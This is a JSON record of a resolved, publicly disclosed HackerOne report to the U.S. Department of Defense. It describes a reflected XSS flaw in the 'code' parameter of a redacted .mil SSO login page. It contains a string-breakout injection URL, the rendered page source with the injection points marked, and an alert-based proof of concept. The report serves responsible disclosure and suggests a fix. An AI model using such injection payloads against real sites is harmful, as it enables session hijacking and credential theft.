{
  "id": 2888784,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg4Nzg0",
  "url": "https://hackerone.com/reports/2888784",
  "title": "XSS vulnerability found in javascript code of https://███.mil",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2024-12-09T11:29:43.037Z",
  "submitted_at": "2024-12-09T11:29:43.181Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "thpless",
    "url": "/thpless",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/7a340dy8tao8fyfeo4pmmxggzoe6/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-01-24T14:45:50.786Z",
  "bug_reporter_agreed_on_going_public_at": "2024-12-19T07:17:02.114Z",
  "team_member_agreed_on_going_public_at": "2025-01-24T14:45:50.581Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Description\n\nHello DoD Team\n\nI  found an XSS vulnerability in the javascript code of  ██████████.mil. The parameter ***code***  isn't sanitized enough to prevent an attack. \n\nIf you click the following link: https://███.mil/?code=xxx';%0d%0a!!!MALICIOUS%20CODE%20HERE!!!;%0d%0avar%20x='\nthe output looks as following.  \nYou can see the three injection points.\n\n```javascript\n<!doctype HTML>\n\n<!-- BEGIN TopCategoriesDisplay.jsp --><!-- BEGIN SSORedirect.jsp -->\n\n<script type=\"text/javascript\">\n\nfunction processUserLogon(action) {\n\tif(action == 'logon') {\n\t\tvar e = document.getElementById(\"environment\");\n\t\tenv = e.options[e.selectedIndex].value;\n\t\tvar logonIdParam = \"\";\n\t\tvar userTypeParam = \"\";\n\t\tif(document.getElementById(\"logonId\") != null) {\n\t\t\tlogonIdParam = \"&logonId=\" + document.getElementById(\"logonId\").value;\n\t\t}\n\t\tif(document.getElementById(\"userType\") != null) {\n\t\t\tvar userType = document.getElementById(\"userType\");\n\t\t\tuserTypeParam = \"&userType=\" + userType.options[userType.selectedIndex].value;\n\t\t}\n\t\t\n\t\twindow.location.href = 'https://' + env + '/webapp/wcs/stores/servlet/ProcessUserSSO?catalogId=10051&langId=-1&storeId=' + 10801\n\t\t\t+ '&sso=true&ssoAction=' + action + '&code=xxx';\n!!!MALICIOUS CODE HERE!!!;\nvar x='' + logonIdParam + userTypeParam + '&uoa=' \n\t\t\t+ '&dodaac=' + document.getElementById('dodaac').value + '&json=' + document.getElementById('json').value;\n\t} else {\n\t\twindow.location.href = 'ProcessUserSSO?catalogId=10051&langId=-1&sso=true&ssoAction=' + action + '&code=xxx';\n!!!MALICIOUS CODE HERE!!!;\nvar x='';\n\t}\n}\n\nfunction getCode() {\n\tvar clientId = \"█████████\";\n\t\n\n\twindow.location.href = 'https://███████/portal/oauth2/authorize?response_type=code&client_id=' + clientId + '&redirect_uri=https://███.mil/webapp/wcs/stores/servlet/en/███?sso=true';\t\n}\n</script>\n\n\n<script type=\"text/javascript\">\n\n\tra2 = \"false\";\n\tif ((document.referrer.indexOf('-ra2.') !== -1)) {\n\t\tra2 = \"true\";\t\n\t}\n\t\n\tvar clientId = \"████████\";\n\t\n\t\n\twindow.location.href = 'ProcessUserSSO?catalogId=10051&langId=-1&app='+clientId+'&ra2='+ra2+'&ssoAction=logon&code=xxx';\n!!!MALICIOUS CODE HERE!!!;\nvar x='&uoa=';\n\n</script>\n<!-- END SSORedirect.jsp --><!-- END TopCategoriesDisplay.jsp -->\t\t\n</html>\n```\n\n### Proof of Concept\n\nhttps://███████.mil/?code=xxx';alert`XSS`;var%20x='\n\n## Impact\n\nAn XSS attack on a login page can lead to credential theft, session hijacking, and user redirection to phishing sites, compromising sensitive data. Malicious scripts can capture user inputs, modify form actions, or steal session cookies, enabling attackers to impersonate victims. Implementing input validation, output encoding, and a strong Content Security Policy (CSP) can mitigate these risks.\n\n## System Host(s)\n███████.mil\n\n## Affected Product(s) and Version(s)\nWebserver\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n###use the link:\n\nhttps://███████.mil/?code=xxx';alert`XSS`;var%20x='\n\n## Suggested Mitigation/Remediation Actions\nsanitize the character ' \n\n``` bash\n'   ===>   \\' \n```\nshould do it\n\n",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 42,
  "voters": [
    "loaymorad",
    "kaenne",
    "almuntadhar",
    "thpless",
    "mikelly",
    "2026",
    "mohaned0101",
    "ahmed_xyz",
    "blackhacker8796",
    "jackhavoltrey",
    "and 32 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
